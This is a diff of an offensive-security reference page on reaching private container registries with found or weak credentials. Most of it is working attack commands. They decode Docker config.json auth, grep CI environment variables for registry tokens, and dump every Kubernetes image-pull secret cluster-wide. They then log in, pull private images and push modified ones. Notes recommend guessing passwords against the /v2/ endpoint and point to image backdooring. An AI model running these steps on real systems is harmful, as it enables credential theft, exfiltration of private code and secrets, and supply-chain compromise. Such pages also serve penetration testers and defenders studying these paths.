@@ -1,34 +1,49 @@
 ---
-title: "Registry access: authenticating to and pulling private images"
-description: "Reaching a private container registry with recovered or weak credentials, including cloud registry tokens and docker config files, to pull private images and read the code, configuration, and secrets they contain."
+title: "Registry access: using found or weak credentials to reach private images"
+description: "Registry credentials turn up in config.json files, CI environment variables, and Kubernetes image-pull secrets. With them, an attacker authenticates to a private registry to pull every image and, depending on the credential's scope, push modified ones. Weak or reused registry passwords extend the same access by guessing."
 keywords:
-  - registry access
-  - docker login
-  - pull private image
   - registry credentials
-  - ECR GCR ACR
+  - docker config.json
+  - imagepullsecret
+  - registry login
+  - supply chain
 ---
 
 # Registry access
 
-Private registries gate pulls behind credentials, which are routinely recoverable: a `~/.docker/config.json`, a Kubernetes image pull secret, or a cloud registry token from instance metadata. With them, pull any image the identity can read.
+Most registries require authentication, but the credentials are widely scattered and often weak. A found token or password lets an attacker pull private images for their code and secrets, and, if the credential has write scope, push modified images. The credential's scope decides whether the access is read-only exfiltration or a supply-chain write.
+
+## Where credentials come from
 
 ```bash
-# Credentials from a recovered docker config (base64 auth entries)
-cat ~/.docker/config.json | jq '.auths'
+# Docker stores registry auth here after a login (base64, not encrypted)
+cat ~/.docker/config.json && echo "<base64>" | base64 -d   # user:token
+# CI systems inject registry creds as environment variables
+env | grep -iE 'REGISTRY|DOCKER_(USER|PASS|TOKEN)'
+# Kubernetes image-pull secrets hold a full dockerconfigjson
+kubectl get secret -A -o jsonpath='{range .items[?(@.type=="kubernetes.io/dockerconfigjson")]}{.data.\.dockerconfigjson}{"\n"}{end}' \
+  | base64 -d
+```
 
-# Cloud registries mint short-lived tokens from the instance/workload identity
-aws ecr get-login-password | docker login --username AWS --password-stdin <acct>.dkr.ecr.<region>.amazonaws.com
-docker pull <acct>.dkr.ecr.<region>.amazonaws.com/<repo>:<tag>
+## Using the credential
+
+```bash
+docker login <registry> -u <user> -p <token>
+docker pull <registry>/<private-repo>:<tag>            # read access
+docker tag x <registry>/<private-repo>:<tag>
+docker push <registry>/<private-repo>:<tag>            # if the token has write scope
+# cloud registries use a helper; the same config.json holds the resolved token
 ```
 
 ## Exploitation notes
 
-- A cloud identity on a compromised host or pod often has registry pull (or push) rights; mint the token from metadata rather than hunting for static creds.
-- Pull rights alone leak source, configs, and secrets; push rights enable [Image backdooring](image-backdooring.md).
-- Image pull secrets stored in orchestrators are a prime source, see [Image pull secret theft](../../containerd-and-cri-o/image-pull-secret-theft.md).
+- `~/.docker/config.json` and Kubernetes `dockerconfigjson` secrets store credentials in base64, which is encoding not encryption; decoding them yields the username and token directly.
+- Read access alone is valuable for pulling private images and mining their layers; test push separately, since many tokens are pull-only.
+- Weak or reused registry passwords are worth guessing against the `/v2/` token endpoint; a valid login there behaves identically to found credentials.
+- Cloud registries (ECR, GCR, ACR) wrap a short-lived token in the same config; the resolved token in `config.json` works until it expires.
 
 ## References
 
-- [Docker: configure registry credentials](https://docs.docker.com/reference/cli/docker/login/)
-- [OCI distribution specification](https://github.com/opencontainers/distribution-spec)
+- [Docker: registry authentication](https://docs.docker.com/reference/cli/docker/login/)
+- [Kubernetes: pull an image from a private registry](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/)
+- [HackTricks: Docker registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)
